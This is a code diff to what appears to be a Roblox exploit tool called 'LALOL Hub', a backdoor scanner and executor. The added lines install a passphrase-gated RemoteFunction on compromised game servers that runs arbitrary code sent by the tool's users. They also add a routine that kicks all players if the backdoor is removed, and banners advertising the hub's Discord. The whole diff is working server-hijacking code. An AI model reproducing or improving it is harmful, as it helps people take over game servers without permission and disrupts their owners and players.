@@ -1482,12 +1482,12 @@ local script = G2L["20"];
 		local remotes={}
 		
 		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
-		if protected_backdoor then
+		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			while true do
 				code=generateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-				protected_backdoor:FireServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+				spawn(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 				remotes[code]=protected_backdoor
 			end
 		
@@ -1558,7 +1558,7 @@ local script = G2L["20"];
 					makeVisible(GUI.Executor, true)
 	
 	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
-					runRemote(remote, "spawn(function()ReplicatedStorage=game:GetService('ReplicatedStorage')Players=game:GetService('Players')local a=require(11611373177)function shutdown(b)for c,d in Players:GetPlayers()do spawn(function()d:Kick(b)end)end end;reputation=30;function addRemoteEvent()local e=Instance.new('RemoteEvent')local f='lh'..game.PlaceId/6666*1337*game.PlaceId;e.Name=f;e.Parent=ReplicatedStorage;e.OnServerEvent:Connect(function(g,h,i)if h=='lalol hub join today!! discord.gg/XXqzxT7E5z'then a(i)()end end)local j;j=e.Changed:Connect(function()spawn(function()j:Disconnect()end)reputation=reputation-1;print('rip reputation')spawn(function()addRemoteEvent()end)e:Destroy()end)end;spawn(function()while wait(0.3)do if 0>=reputation then shutdown('[Anti-Hack] Something went wrong...')end end end)addRemoteEvent()end)")			
+					runRemote(remote, "spawn(function()ReplicatedStorage=game:GetService('ReplicatedStorage')Players=game:GetService('Players')local a=require(11611373177)function shutdown(b)for c,d in Players:GetPlayers()do spawn(function()d:Kick(b)end)end end;reputation=30;function addRemoteEvent()local e=Instance.new('RemoteFunction')local f='lh'..game.PlaceId/6666*1337*game.PlaceId;e.Name=f;e.Parent=ReplicatedStorage;e.OnServerInvoke=function(g,h,i)if h=='lalol hub join today!! discord.gg/XXqzxT7E5z'then a(i)()end end;local j;j=e.Changed:Connect(function()spawn(function()j:Disconnect()end)reputation=reputation-1;spawn(function()addRemoteEvent()end)e:Destroy()end)end;spawn(function()while wait(0.3)do if 0>=reputation then shutdown('[Anti-Hack] Something went wrong...')end end end)addRemoteEvent()end)")			
 					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
@@ -1593,9 +1593,15 @@ local script = G2L["20"];
 		local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
 		
 		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
-		if protected_backdoor then
+		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			debug('Protected backdoor found', 3)
-			protected_backdoor:FireServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a)
+			spawn(function()
+				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a) end)
+				if variantValue~=nil then
+					local splited=string.split(variantValue,':')
+					notify(splited[#splited])
+				end
+			end)
 		else
 			runRemote(backdoor, a)
 		end
